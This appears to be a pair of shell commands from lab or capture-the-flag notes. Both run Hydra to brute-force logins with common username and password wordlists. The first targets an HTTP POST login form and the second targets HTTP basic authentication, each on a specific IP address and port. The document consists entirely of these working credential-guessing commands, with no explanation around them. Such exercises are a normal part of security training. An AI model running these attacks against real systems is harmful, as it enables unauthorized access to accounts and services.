```shell
$ hydra -L top-usernames-shortlist.txt -P /usr/share/wordlists/2023-200_most_used_passwords.txt -f 94.237.54.231 -s 45961 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

```bash
$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.59.180 http-get / -s 56946
```

